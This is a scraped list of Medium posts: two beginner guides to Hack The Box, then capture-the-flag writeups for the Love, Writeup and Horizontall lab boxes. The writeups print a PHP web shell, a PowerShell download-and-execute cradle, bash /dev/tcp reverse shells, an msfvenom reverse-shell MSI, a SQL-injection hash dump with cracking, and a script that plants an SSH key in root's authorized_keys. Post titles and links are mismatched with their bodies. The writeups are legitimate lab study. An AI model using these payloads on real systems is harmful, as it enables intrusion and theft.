        "content": "Hello hackers!!!As promised here’s the second part of my Unleash Your Inner Hacker: Where to Start in Hack The Box?\nIn the first part,we introduced the platform, we covered HTB Academy with suggested modules to get started right away. And above all, we talked about the importance of community.\nBear in mind that the tone of these articles should be perceived as a “friendly conversation” like I was sharing these if I met you in person and we started talking about one of our favorite subjects, hacking.\nHTB Meetup — Lisbon\nBy now you know that at the end of the day, it’s all about learning. You chose your HTB Academy modules, you studied them thoroughly you took your notes maybe you even attended a couple of meetups in person. You’re studying and practicing all of those concepts we talked about. But now you want to get down to business.\nslide from HTB — Lisbon meetup\nI’m with you. It’s time to get your feet wet. To get a real taste of things.\nwww.hackthebox.com/hacker/hacking-labs\nThese are virtual penetration testing labs, with simulating up-to-date security vulnerabilities and misconfiguration for you to train and explore.\nThis is the place where you’ll be testing the skills and knowledge you’ll acquire in your journey. What’s amazing about these labs is precisely the possibility of learning all the latest attack paths and exploit techniques. All in a safe, legal, and secure environment.\nI’m overwhelmed by the possibilities, so many options…\nEasy Elliot. The best place for your to start is precisely the STARTING POINT\nslide from HTB — Lisbon meetup\nThis is where you’ll learn the basics of Penetration Testing in an actionable, structured, comprehensive way. Yes, you’ll be hacking!\nThe machines/boxes you’ll be hacking in Starting Point are separated by Tiers according to their technical difficulty. Start with Tier 0 and build up from there.\nDoes this mean I will not need HTB Academy?\nHTB Academy will always be with you. As we discussed previously. Academy provides guided training and industry certifications. Companies from all over the world use this resource to train their professionals. A valuable resource from beginners to seasoned experts.\nYou can pair your STARTING POINThacking withyourHTB Academy studies and modules. Every Tier has an associated module from HTB Academy, these will give you the guidance you’ll need regarding the technology and subjects you have to learn and master in order to solve those machines.\nwww.hackthebox.com/hacker/hacking-labs\nTake it slow and steady. Do it in a structured way. What I mean by this is to resist the urge to ‘jump’ from machine to machine if you encounter difficulties. Be sure to solve them in order.\nDo not expect to solve a machine quickly and easily. It’s supposed to be a challenge. If you’re not fully understanding what you’re dealing with I recommend taking a step back, reading, practice those HTB Academy once again.\nYou can always refer to the official Walkthroughs HTB made available for every machine on Starting Point. It’s okay to use them. These provide learning opportunities. Just make sure you do not follow them blindly. Try to understand the concepts behind every step. Study them. Reproduce the steps by yourself, and try to anticipate the next step.\nHow To Play Machines\nIf you want a full, comprehensive rundown of navigating and interacting with HTB Labs I suggest taking a look at How to Play Machines by Ryan Gordon.\nYou are not alone!\nRemember to join the HTB community:\nFeel supported, and get involved. Either on Discord, Forum, or join a meetup group. If you’re near Portugal, let’s connect and join the next in-person meetup.\nHack The Box Meetup: Portugal\nTo be continued…\nIn part 3 We’ll start to drill down on more HTB features and the next steps. Reach out and tell me if this is something it might interest you.\nHack all the things! Have all the fun! This is the way!\nDisclaimer! This writeup contains affiliate links."
    },
    {
        "title": "Unleash Your Inner Hacker: Where to Start in Hack The ...",
        "link": "https://medium.com/@pedro.correia_8569/unleash-your-inner-hacker-where-to-start-in-hack-the-box-pt-1-994033ac3a6f",
        "content": "Love is an easy Windows box created by pwnmeow on Hack The Box and was released on the 1st of May 2021. Hello world, welcome to Haxez where today I will explain how I hacked Love. To hack this box is it recommended that you have Windows enumeration and web enumeration skills. From hacking this box, you will learn exploit modification, server-side request forgery, applocker policies, and always install everything misconfiguration.\nLove Enumeration\nAfter spawning the box, I sent a single ping request to ensure it was online. I then followed up with a Nmap scan targeting all ports, requesting service versions, and running default scripts. Finally, I gave it a minimum packet rate of 10000 and said to output all formats. From the results, I learnt that there were several ports open. This included various ports for HTTP, 445 for SMB, 3306 for MySQL, 5985 and 5986 for HTTPAPI or WinRM, the list goes on.\n┌──(kali㉿kali)-[~/HTB/Love]└─$ sudo nmap -sC -sV -p- 10.129.48.103 --min-rate 10000 -oA love\nAs SMB was listening, the first thing I did was run crackmapexec to enumerate shares and host information. From the results, I learnt that it was a Windows 10 Pro box with the hostname LOVE. The domain was also called Love which suggests the box is not a domain controller (as they have the same name). Furthermore, SMBv1 was enabled.\n┌──(kali㉿kali)-[~/HTB/Love]└─$ crackmapexec smb 10.129.48.103\nLove Web Application Enumeration\nAfter poking SMB, I went to take a look at the web application. First, I visited the application in my browser and saw that it was a type of voting application. Next, I appended various extensions to the end of the index page. As a result, I learnt that the application was written in PHP.\nFollowing that, I ran whatweb against the application and learnt that the PHP version was 7.3.27. Furthermore, I also learnt that the Apache version was 2.4.46 and that the application was using the Bootstrap framework.\n┌──(kali㉿kali)-[~/HTB/Love]└─$ sudo whatweb -a3 http://10.129.48.103/ -v\nI also ran a gobuster scan to try to identify any directories or files that would disclose sensitive information about the application. However, other than some 301 and 302 redirections and a bunch of 403 errors, I didn’t find much.\n┌──(kali㉿kali)-[~/HTB/Love]└─$ gobuster dir -u http://10.129.48.103/ -w /media/sf_OneDrive/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -x php,txt,bak -o gobuster.love.txt\nMore Love Application Enumeration\nI decided to look at the other HTTP ports that were discovered during the Nmap scan. Therefore, I punched the IP address of the box into my browser and specified port 5000. Immediately, I received a Forbidden error. I shouldn’t have been surprised by this as Nmap displayed the forbidden error in the results.\nSubdomains and Virtual Hosts\nI revisited the results of the Nmap scan to choose which service to poke at next. It was then that I noticed the common name of the SSL certificate on port 443. Below, you can see the output from the Nmap scan showing the subdomain of staging.love.htb.\nImmediately, I excitedly added the IP address and new subdomain to my host file. Surely this was the foothold that I’d been looking for. Finally, I found a weakness in this box’s armour! I entered the domain into my browser and…. Forbidden. Wow, talk about rejection.\n┌──(kali㉿kali)-[~/HTB/Love]└─$ echo '10.129.48.103 staging.love.htb' | sudo tee -a /etc/hosts\nHowever, visiting the subdomain via HTTP instead of HTTPS loaded a page. I poked around the application for a bit and noticed a demo page. In short, the demo page is a free file scanner that allows the user to submit a URL with a file for scanning.\nServer-Side Request Forgery\nI wanted to see if the demo page worked so I set up a netcat listener on my local machine. Next, I input the location of a file into the Scan File input box and sent the request. Sure enough, the application pulled the file down from my host and displayed the contents. Admittedly, my first thought was to try and get it to execute a payload by downloading it from my host. However, those attempts failed.\nThere is a Web Application vulnerability known as Server Side Request Forgery. In short, SSRF exploits the box’s own trust. Because the resource request is sent from the box itself, it may allow access to otherwise forbidden files. To illustrate, I input the loopback address of 127.0.0.1 followed by port 5000 into the URL box. This was the page I was previously unable to access. Upon sending the request, I received credentials.\nVoting System Admin\nWith the username and password successfully stolen via SSRF, I headed back to the voting system by navigating to the IP address. Next, I supplied the stolen credentials and… they didn’t work. This is another one of those easy boxes which seems more difficult than it is because it takes so long.\nFortunately, I ran a gobuster earlier and remember seeing a 301 redirection from /admin to /admin/. This is where gobuster attempted to load a file called admin but was redirected to a directory called admin, likely containing a PHP file. Therefore, I headed to the admin directory and was able to log in with the credentials.\nLove RCE POC\nI noticed the Copyright disclaimer at the bottom of the page and decided to perform a Google search for the name SourceCodeStar. After a few Google searches, I stumbled upon several Exploit Database pages which suggested there was an authenticated remote code execution. Unfortunately, there didn’t appear to be a CVE number associated with it.\nAdmittedly, I wanted some guidance on this step so I am going to copy what IppSec did >>HERE<<. First, I navigated to the Voters menu option and clicked the New button. This spawned the window you see below. I populated the window with some test data and selected a jpeg file for the photo.\nNext, I turned intercept on and clicked the save button. Burp successfully intercepted the request which I then modified. I changed the filename to “haxez.php” and then removed the jpeg data and replaced it with a PHP web shell.\n------WebKitFormBoundaryM93O7d6XpEp6S0dPContent-Disposition: form-data; name=\"photo\"; filename=\"haxez.php\"Content-Type: image/jpeg<?php system($_REQUEST[\"cmd\"]); ?>\nThen, I navigated to the payload in my browser and passed the dir command to the cmd parameter. It successfully listed out the contents of the directory.\nLove Foothold\nNow that I had command execution, it was time to get on the box using a reverse shell. I downloaded nishang from >>HERE<< and copied the Invoke-PowerShellTcpOneLine.ps1 payload to my current working directory. Next, I opened the payload with VIM and changed the IP address and port to my tun0 IP address and port 9001.\nThen, I sent my original directory listing request to Burp repeater and changed the request method to a POST. Next, I started a netcat listener and then added the following Payload to Burp and sent the request. I instantly received a 404 error. There must be a clean-up script on the box that is removing the payloads.\ncmd=powershell \"IEX(New-Object Net.WebClient).downloadString('http://10.10.14.36/hax.ps1')\"\nI quickly repeated the process by uploading a new command shell and executing the above payload. Finally, I got a reverse shell and had a foothold on the box. From here, I was able to grab the user flag from the phoebe users desktop directory.\n┌──(kali㉿kali)-[~/HTB/Love]└─$ sudo nc -lvnp 9001                                             [sudo] password for kali: listening on [any] 9001 ...connect to [10.10.14.36] from (UNKNOWN) [10.129.48.103] 59730PS C:\\xampp\\htdocs\\omrs\\images> whoamilove\\phoebePS C:\\xampp\\htdocs\\omrs\\images> type C:\\Users\\phoebe\\Desktop\\user.txtd85▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓319\nLove Privilege Escalation\nAfter capturing the user flag, I download the latest version of the 64 bit obfuscated WinPEASS binary. Next, I spawn a Python3 web server and used cURL to download the binary to the target machine. Finally, I ran the executable and saw that the AlwaysInstallElevated value was set to 1 which I presume means it was enabled. Quoting directly from the HackTricks article “If these 2 registers are enabled (value is 0x1), then users of any privilege can install (execute) *.msi files as NT AUTHORITY\\SYSTEM.”. Is this a useful setting to have as a sysadmin? it seems a bit odd.\nWith this knowledge, I went back to my Linux terminal and used msfvenom to create an MSI payload. The output below will create a Windows x64 reverse shell that connects back to my local host on port 9002. The file type is specified as an MSI file and I saved the output to payload.msi.\n┌──(kali㉿kali)-[~/HTB/Love]└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.36 LPORT=9002 -f msi > payload.msi\nI set up a netcat listener to listen on port 9002 and then used cURL to download the payload from the Python web server I still had running. I specified the -o flag to save the payload as payload.msi.\nPS C:\\users\\public\\documents> curl http://10.10.14.36/payload.msi -o payload.msiPS C:\\users\\public\\documents> .\\payload.msi\nFinally, I ran the payload and thankfully, I received a connection back to the netcat listener. I now had a reverse shell as the nt authority\\system user and could finally capture the root flag.\n──(kali㉿kali)-[~/HTB/Love]└─$ sudo nc -lvnp 9002                                           [sudo] password for kali: listening on [any] 9002 ...connect to [10.10.14.36] from (UNKNOWN) [10.129.48.103] 59734Microsoft Windows [Version 10.0.19042.867](c) 2020 Microsoft Corporation. All rights reserved.C:\\WINDOWS\\system32>type \\users\\administrator\\desktop\\root.txttype \\users\\administrator\\desktop\\root.txt64b▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓95f\nLove Learnings\nLove requires patience… the initial enumeration stage of this box took longer than I had hoped. It felt like I was jumping through hoops but it taught me valuable lessons about enumeration. It’s one of those boxes that seemed difficult due to the level of enumeration required to get a foothold, but the actual exploit is easy. Furthermore, it does a great job of demonstrating Server Side Request Forgery which I hadn’t really done before.\nThe privilege escalation was a lot of fun and fairly simple to pull off. I didn’t know about this method of privilege escalation until today so I’ve learnt that too. Overall it’s a fun box but it definitely tested my patience at times. My initial PHP shell just up and vanished so I had to upload that again before getting my reverse shell. For me, it was educational and taught me new techniques which is what I want from an easy box. Thanks for the box."
    },
    {
        "title": "Hack The Box Writeup Writeup",
        "link": "https://medium.com/@joemcfarland/hack-the-box-writeup-writeup-338083ef9057",
        "content": "Writeup is an easy Linux box created by jkr on Hack The Box. The box has protections in place to prevent brute-force attacks. The skills required to complete this box are enumeration. The skills obtained from completing this box are process enumeration and path hijacking. Hello world, welcome to Haxez where today I will be explaining how I hacked the Hack The Box Writeup box.\nEnumerating Writeup\nFirst, I spawned the box and connected my attack box to the Hack The Box lab VPN. Next, I sent a ping to the target to ensure it was online and that I could talk to it. Once the box responded, I performed a Nmap scan targeting all ports. Furthermore, I also requested service versions, told it to run default scripts, gave it a minimum packet rate of 10,000, and told it to save the output in all formats named writeup. As you can see from the screenshot below, ports 22 for SSH and 80 for HTTP were open.\nsudo nmap -sC -sV -p- 10.129.95.203 --min-rate 10000 -oA writeup\nWeb Application Enumeration\nSince SSH was unlikely to be the intended attack vector, I moseyed on over to the web application for a gander. It’s… beautiful! The web application appeared to be an in-development blog for Hack The Box writeups. However, the application was being hit with denial-of-service attacks resulting in DoS protection mechanisms being implemented. The DoS protection blocks any IP that triggers a 400 error in the Apache log.\nDomo arigato, Mr Roboto\nDirb, gobuster, ffuf, and other directory and file brute force tools are noisy and would generate 400 errors resulting in an IP ban. Therefore, I had to manually and carefully enumerate the web application. One of the first files I look for when hacking web applications is the robots.txt file. It’s a file that tells search indexing robots to ignore the files contained within it. It prevents pages like admin or log-in from being indexed. However, it’s a double-edged sword as it may disclose sensitive information to malicious threat actors. Navigating to the robots.txt file I found a directory called writeup.\nEnumerating Writeup Technologies\nI navigated to the writeup directory which presented a basic web application with minimal functionality. There were several links to blog posts and clicking on those blog posts revealed that it was a PHP-based application. Furthermore, a parameter named page was being used to retrieve the blog posts. For example, visiting the following URL would retrieve a blog post called blue http://10.129.95.203/writeup/index.php?page=blue. I used whatweb to identify the CMS or Content Management System. As a result, I learned that it was using a version of CMS-Made-Simple from 2004–2019.\nFurthermore, looking at the structure of the CMS I found the location of the changelog file. Navigating to the file revealed the specific version of the CMS being used.\nCMS Made Simple Blind SQL Injection Failures\nUsing searchsploit to search for vulnerabilities impacting CMS Made Simple, I found a blind SQL injection vulnerability. The vulnerability has a CVE designation of CVE-2019–9053. I located the Python script and copied it to my current working directory. You can do this with the searchsploit -m flag to mirror it.\nUnfortunately, attempting to run this exploit produced errors regarding print statements. I wasn’t sure what to do here as I’m crap at Python. Fortunately, IppSecs video explained that I needed to install the termcolor module with pip. While this didn’t resolve the problem, it did point me in the right direction.\nFirst, I had to install pip2.7 which I was able to do by following the post >>HERE<<\nwget https://bootstrap.pypa.io/pip/2.7/get-pip.pysudo python2.7 get-pip.py\nHowever, when attempting to install termcolor, I received errors about an egg or something. After a bit more Google searching, I found this post >>HERE<< which explained I needed to upgrade setuptools.\npip install --upgrade setuptools\nCMS Made Simple Blind SQL Injection Success\nI was finally ready to run the payload. Using the following command, I was able to attack the SQL injection vulnerability and retrieve a salt, username, email address, and password hash. It was awesome watching the script come alive and iterate through the alphabet and pull the information out of the database.\npython2.7 46635.py --url http://10.129.95.203/writeup\nWriteup Foothold\nI echoed the hash followed by a colon, followed by the salt into a file called jkrhash.txt.\necho '62def4866937f08cc13bab43bb14e6f7:5a599ef579066807' > jkrhash.txt\nNext, I used hashcat with mode 20 (MD5 salt and password) to crack the hash with the wordlist rockyou.\nhashcat -a 0 -m 20 jkrhash.txt /usr/share/wordlists/rockyou.txt\nI was in, I was able to use the credentials to SSH to the box as the jkr user. Furthermore, once on the box, I was able to capture the user flag.\njkr@writeup:~$ cat user.txt8d0▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓9e9\nWriteup System Enumeration\nAfter grabbing the user flag, I started enumerating the system. First, I checked the command history of the jkr user to see if it contained anything interesting. It didn’t. Next, I checked if I could run sudo -l to see what commands jkr could run as sudo. Interestingly, sudo wasn’t found on the system. Finally, I decided to go for the easy option and ran linpeas. I span up a Python webserver and used wget to download it to the /tmp directory. Then, I gave it executable permissions and ran it.\nThe output kept highlighting the /usr/local path as a privilege escalation vector but I didn’t know why. After a bit more investigation, it seems that the jkr user is part of the staff group. According to the Debian wiki the staff group allows users to add local modifications to the system (/usr/local) without needing root privileges (note that executables in /usr/local/bin are in the PATH variable of any user, and they may “override” the executables in /bin and /usr/bin with the same name). As you can see from the screenshot below, /usr/local/bin is also the first path that gets called when executing files.\nWriteup Process Enumeration\nI’m still getting my head around this privilege escalation method if I’m honest. However, I think I understand it. To explain, the jkr user is a member of the staff group and the staff group has the ability to modify /usr/local/ without root privileges. If I can find a binary that gets executed as root without it using the absolute file path, then I can drop a malicious binary of the same name inside the /usr/local/bin directory. Then, when the conditions are met for the binary to be executed, my malicious binary gets executed with root privileges because my first environmental path is /usr/local/bin.\nWith that in mind, I ran pspy32 and found that when I log in to SSH with jkr, the run-parts binary is executed without an absolute file path. You can see it in the image below, the third blue line from the bottom.\nNext, I checked to see the ownership of the run-parts binary to see if it was owned by root. I used which to locate it and then ran ls -lash to list the permissions. Sure enough, it was owned by root and genuinely appeared to be the only binary not being executed with a full file path.\nWriteup Privilege Escalation\nIn theory, I should now be able to create my own binary or script called run-parts in /usr/local/bin. Then when I SSH to the system as jkr, my malicious run-parts binary will be executed instead of the one in /bin. There are multiple methods that I could have used to do this. For example, I could have created a script that copied the bash binary to /tmp and gave it setuid capabilities (I think). Additionally, I could have created a reverse shell that connected back to my machine. However, I thought the most reliable method was to drop an SSH key in the root user’s authorized_keys file. Plus, this is the method that IppSec used and it seemed to work.\nWhen the script is executed, it creates a file in /tmp called Exploit-Complete. This isn’t required as it’s just a visual indicator to show that the script was executed. Next, it creates the .ssh directory in the root user’s directory. Then, it echos my public key into the root user’s authorized_keys file. Finally, it gives the file 600 permissions. The script is saved as run-parts and saved to /usr/local/bin. I created it using nano.\n#!/bin/bashtouch /tmp/Exploit-Completemkdir /root/.sshecho 'ssh-rsa AAAA <<<SNIP>>> QqNzw9WKiU0= kali@kali' >> /root/.ssh/authorized_keyschmod 600 /root/.ssh/authorized_keys\nOnce the file was saved, I made it executable by running chmod +x against it. Then I created a new terminal tab and connected back to the box as the jkr user. I checked the /tmp directory and sure enough, the Exploit-Complete file had been created. Hopefully, that means that my public key is now in the root user’s authorized_keys files.\nFinally, I connected SSH as the root user using the private key I generated. I was able to login and grab the root flag.\n┌──(kali㉿kali)-[~/HTB/Writeup]└─$ ssh -i root root@10.129.95.203Last login: Fri Aug  6 08:59:19 2021root@writeup:~# cat root.txt786▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓4b4\nWriteup Learnings\nThis was a fun box which I learned a few things from. The first was getting the Python SQL injection payload to work. As soon as I received that first error I immediately thought that I wasn’t going to be able to complete the box. However, after a bit of persistence, the payload worked and left me with a big grin on my face. The cracking was fairly simple but always good to get some practice.\nThe system enumeration and privilege escalation was interesting. I didn’t know about the staff group before and without guides pointing me in the right direction, I wouldn’t have got it. I’m starting to understand the brilliance of pspy too, without it, I’m not sure how I would have identified the correct binary. Overall this is a good box and has a nice method for practicing different techniques for privilege escalation. You could change your binary to perform different things and then easily trigger it by connecting back to the box. Thanks, jkr, fun box."
    },
    {
        "title": "Hack The Box Love Writeup",
        "link": "https://medium.com/@joemcfarland/hack-the-box-love-writeup-d58982ffa4ec",
        "content": "In our previous Hack The Box in-person meetups in Lisbon and Oporto I had the opportunity of presenting HTB in all its splendor. We talked about #hackthebox history, what hacking is, where to start, how to learn, and the importance of the community.\nThe response was overwhelming. It was amazing to get together with experienced professionals and newcomers, we created an environment where everyone felt supported and welcomed.\nHTB Meetup — Lisbon\nHTB Meetup — Oporto\nFollowing these last couple of events, I got a lot of requests to suggest a kind of “roadmap” for those complete beginners in hacking and HTB.\nI decided to write a couple of articles suggesting my approach to HTB and hacking. Take these and they are, personal and subjective. This aims to be a “friendly conversation” like I was sharing these if I met you in person and we started talking about one of our favorite subjects, hacking that is.\nThis is the first part of our convo. I’ll be covering HTB Academy and leave you with a cliffhanger.\nI’m not going to talk about what is hacking. As we presented on our meetup r0adrunn3r from HTB did that in a stellar way in her impressive How to learn hacking: The (step-by-step) beginner’s bible for 2023.\nhackthebox.com/blog/learn-to-hack-beginners-bible\nStart here:\nThat’s the place to start if you’re a complete beginner. Start there and read it. Get fundamental answers for questions like:\n* What is hacking?\n* Can anyone learn how to hack?\n* Where should beginner hackers start? and many more.\nThe article is written in a way that’s informative and makes you feel welcomed and supported. She even discusses the hats hackers should be wearing. If you know me you know my take on that:\nhttps://www.hackthebox.com/blog/htb-community-manifesto , slide from HTB — Lisbon meetup\nRead the Community Manifesto:\nHTB is all about the importance of the community. A happy, non-toxic, open, educational, active, and passionate society for hackers.\nIt’s our ultimate responsibility to ensure our values. Promote respect and a safe place. We all are learners, we all struggle from time to time. In such a highly demanding field as cybersecurity, it’s essential to foster a helpful and supportive community. That’s the only way to grow and learn.\nTalk about learning:\nLearning in everything. This journey is above all about learning. So having a mindset where acquiring knowledge is your reward will help you in the long run.\nYou’ve seen the memes:\nGot this from a web search, there was no explicit author.\nI bet you can do the splits, but even Jean Claude Van Damme didn’t skip the fundamentals. Why should you?\nFundamentals! Fundamentals! Fundamentals! — HTB Academy\nThat’s right. Start learning now. Start with the fundamental cybersecurity skills. This is the beginning of your journey into hacking and the world of cybersecurity. Make sure you start with the proper foundations.\nCreate an account on Hack The Box Academy, this is without a doubt the perfect place for you to start. From complete beginners to seasoned professionals I can guarantee you that this is a resource you’ll be using throughout your career.\nHTB — Academy provides guided training and industry certifications. Companies from all over the world use this resource to train their professionals. Where should you start?\nHacker meets HTB — Academy, HTB — Academy this is hacker:\nGet acquainted with the platform and the learning process. This module will welcome you and guide you at the beginning of your learning journey at the Academy. Think of this as the tutorial stage of your favorite game.\nGot it! What’s next?\nLearn how to learn — the starting module:\nLearning Process created by Cry0l1t3\nIn this demanding and ever-changing field, prepare yourself for neverending study. Having methodologies and processes will not only optimize your learning but ensures your mental safety. Protect yourself from burnout, impostor syndrome… Be prepared. The amount of information can be overwhelming when you first start so you must keep yourself organized. Also, frustration is going to creep up on you, better be prepared to deal with it.\nTake notes:\nThat reminds me. Always take notes! I mean ALWAYS (yea, all caps). Start now, make it a habit. Take notes now, while learning. Take notes later, while hacking. This will not only improve your concept retention but you’ll be creating your knowledge base you can always refer to.\nChoose a note-taking app and start now:"
    },
    {
        "title": "Hack The Box Horizontall Writeup",
        "link": "https://medium.com/@joemcfarland/hack-the-box-horizontall-writeup-4f10ec21a949",
        "content": "Horizontall is an easy Linux box created by wall99 on Hack The Box and was released on the 28th Aug 2021. Hello world, welcome to haxez where today I will be going through how I hacked Horizontall. To complete this box it is suggested that you have basic Web Enumeration, Linux Enumeration, and SSH Knowledge. The lessons from this box are Source Code Review and Port Forwarding.\nHorizontall Enumeration\nTo ensure that the box was online and that I could talk to it, I sent a ping request. Since the box responded, I performed a Nmap scan against all ports, with default scripts and requested service versions. As a result, I learnt that ports 22 for SSH and 80 for HTTP were open.\nHorizontall Application Enumeration\nNavigating to the IP address in my browser, I was redirected to the domain horizontall.htb. However, as this domain name doesn’t resolve through DNS I received an error from Burp.\nTo fix this, I echoed the box’s IP address and domain name into my host’s file. As a result, when visiting the domain name the application loaded as expected. The web application appeared to be a commercial website for a website development company. However, the website wasn’t functional as the links and the contact us form didn’t work.\n┌──(kali㉿kali)-[~]└─$ echo \"10.129.234.11 horizontall.htb\" | sudo tee -a /etc/hosts\nNext, I ran whatweb but it didn’t reveal much about the application that Nmap hadn’t already told me. It told me the server was Ubuntu and that the web server was nginx.\n┌──(kali㉿kali)-[~]└─$ whatweb http://horizontall.htb/\nI ran 2 gobuster scans, 1 to look for directories and 1 to look for virtual hosts but unfortunately, neither produced anything interesting. I think I’m running gobuster incorrectly for virtual hosts. I believe there is an –append-word argument that needs to be added but I get an error when doing that. I will have to look into that this evening.\n┌──(kali㉿kali)-[~]└─$ gobuster vhost -w /media/sf_OneDrive/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://horizontall.htb -o vhostgobuster.txt -t 50\nHowever, ffuf does find the virtual host. I filtered by a file size of 194 because that was the file size of the generic error response. I’m doing something wrong with gobuster. Since I wouldn’t have found the virtual host, I’m going to ignore these results and continue enumerating. I’m going to search the academy for gobuster this evening.\n┌──(kali㉿kali)-[~]└─$ sudo ffuf -u http://horizontall.htb/ -H \"Host: FUZZ.horizontall.htb\" -w /media/sf_OneDrive/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -fs 194\nReturn To The Source\nIt’s where one must go when they’ve run out of ideas. As you can see below, there were references to Cascading Style Sheet files and Javascript files. I decided to take a look at the Javascript files to see if they contained anything interesting.\nHowever, the way the browser rendered the code was horrible so I went to https://beautifier.io/ and pasted in the Javascript. Skimming through the code, I noticed a function called getReviews which pointed to the subdomain api-prod.\nAPI Virtual Host Enumeration\nAfter adding the new virtual host to my host file, I navigated to it in my browser. There wasn’t much to look at other than a welcome message.\nI’m pleased to say that gobuster worked for directory brute forcing. It seems there were 3 subdirectories.\n┌──(kali㉿kali)-[~]└─$ gobuster dir -u http://api-prod.horizontall.htb/ -w /media/sf_OneDrive/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt\nI navigated to the admin directory which rendered a login page. The page revealed that the technology in use was strapi. Next, I visited the reviews page which returned a JSON response from the server showing reviews of the product.\nFollowing the discovery of the technology, I searched for exploits on Exploit Database and found an RCE. In short, the exploit performs a password reset. It’s written in Python and exploits the vulnerability with the CVE designation CVE-2019-18818. The CVE description explains the following.\nstrapi before 3.0.0-beta.17.5 mishandles password resets within packages/strapi-admin/controllers/Auth.js and packages/strapi-plugin-users-permissions/controllers/Auth.js.\nTherefore, I navigated to the /admin/init endpoint to retrieve the service version to determine whether it was vulnerable. The API reported back that it was version 3.0.0-beta.17.4 which suggested it should be.\nHorizontall Foothold\nDon’t you just love it when an exploit just works without having to tinker with it? I copied the code and recreated it locally in a file called exploit.py. Next, I used Python3 to run the code and fed it the URL of the application. Almost immediately, the exploit told me that the password was reset successfully.\n┌──(kali㉿kali)-[~/HTB/Horizontall]└─$ python3 exploit.py http://api-prod.horizontall.htb/\nJust like that, I had code execution and could send myself a reverse shell. First, I set up a netcat listener on my attack box. Next, I ran the following command in the shell on the target machine. Finally, I landed on the box as the strapi user and was able to grab the user flag.\nbash -c 'bash -i >& /dev/tcp/10.10.14.36/9001 0>&1'┌──(kali㉿kali)-[~]└─$ sudo nc -lvnp 9001[sudo] password for kali: listening on [any] 9001 ...connect to [10.10.14.36] from (UNKNOWN) [10.129.234.11] 46802strapi@horizontall:~/myapi$ ls /homels /homedeveloperstrapi@horizontall:~/myapi$ cat /home/developer/user.txtcat /home/developer/user.txt6e7▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓dc0strapi@horizontall:~/myapi$\nHorizontall Authenticated Enumeration\nFirst, I wanted to establish persistence on the host so I created a .ssh directory in /opt/strapi/.ssh. Next, I created an SSH key using ssh-keygen and echoed the public key into the authorized_keys file. Finally, I gave the SSH private key 600 permissions and used it to SSH to the host. Once I was back on the host I enumerated the listening services and discovered that port 8000 and MySQL were listening locally.\nFirst, I decided to try and get access to MySQL. Starting at the /opt/strapi/ directory, I ran a recursive grep for the word password but was bombarded with noise. After jumping around a few directories I finally found the database password.\nstrapi@horizontall:~/myapi/config$ grep -R passwordenvironments/production/database.json:        \"password\": \"${process.env.DATABASE_PASSWORD || ''}\",environments/development/database.json:        \"password\": \"#J!:F9Zt2u\"environments/staging/database.json:        \"password\": \"${process.env.DATABASE_PASSWORD || ''}\",\nAs a result, I was able to log in to the MySQL database as the development user but this appeared to be a dead end. I queried the database and dumped the contents of the various user tables but couldn’t find any hashes other than the administrators.\nSince MySQL was a dead end, I moved on to see what was listening on port 8000. Using SSH, I performed local port forwarding so that I could access port 8000 via localhost:1234. Upon visiting that port I found a Laravel application.\n┌──(kali㉿kali)-[~/HTB/Horizontall]└─$ ssh -L 1234:localhost:8000 -i key strapi@10.129.234.11\nI ran gobuster to discover directories and was able to identify the /profiles directory. However, the box crapped out shortly after and killed my tunnel.\n┌──(kali㉿kali)-[~]└─$ gobuster dir -u http://localhost:1234/ -w /media/sf_OneDrive/SecLists/Discovery/Web-Content/raft-small-words.txt\nI recreated the tunnel and navigated to the profiles directory. The application appeared broken and had visual debugging enabled. Searching Google for Laravel Debug exploits resulted in finding this payload >>HERE<<which I recreated locally.\nHorizontall Privilege Escalation\nI ran the exploit using the syntax below and the results indicated that Laravel was running as root. I was almost there, all I needed to do now was craft a reverse shell and send it back to myself.\n┌──(kali㉿kali)-[~/HTB/Horizontall/laravel]└─$ python3 exploit.py http://localhost:1234 Monolog/RCE1 id\nI was close to getting it right the first time. You can see from the screenshot below the different payloads I tried before resuming IppSec’s video. I attempted the first two on my own before resuming the video but as soon as he said curl, I paused it again and executed the payload myself. Little victories.\nI created a shell script which contained the following bash script. I then used the exploit with curl to download the file which I then piped to bash to execute it.\n┌──(kali㉿kali)-[~/HTB/Horizontall]└─$ cat shell.sh      #!/bin/bashbash -i >& /dev/tcp/10.10.14.36/9002 0>&1\nBelow, you can see the exact command I used. It needed to be enclosed in single quotation marks. If medium will let me include it that is.\nThis connected back to my netcat listener and allowed me to capture the root flag.\n┌──(kali㉿kali)-[~]└─$ nc -lvnp 9002listening on [any] 9002 ...connect to [10.10.14.36] from (UNKNOWN) [10.129.234.11] 42330bash: cannot set terminal process group (65829): Inappropriate ioctl for devicebash: no job control in this shellroot@horizontall:/home/developer/myproject/public# cat /root/root.txtcat /root/root.txt19c▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓8f4root@horizontall:/home/developer/myproject/public#\nHorizontal Learnings\nThere was certainly a lot to learn from this one. I’m starting to understand the difference between difficult and time-consuming boxes. The time it takes to own a box doesn’t necessarily equate to the difficulty. This box took me a long time to complete but it wasn’t that difficult. Owning this box required exploiting publically known vulnerabilities with available exploits. In my opinion, that is exactly what an easy box should be. It did require a lot of enumeration and knowing what to look for.\nI enjoyed this box a lot, it let me practise techniques I’m familiar with. It introduced me to technologies I hadn’t used before and their vulnerabilities. Furthermore, it also highlighted areas where I need to invest time to improve. Admittedly, I was worried that the different exploits weren’t going to work but I was pleasantly surprised. Overall, this was a great box which I’m probably going to revisit to get a better understanding."
    },
    {
        "title": "Hack The Box Teacher Writeup",
        "link": "https://medium.com/@joemcfarland/hack-the-box-teacher-writeup-31979f830ba1",
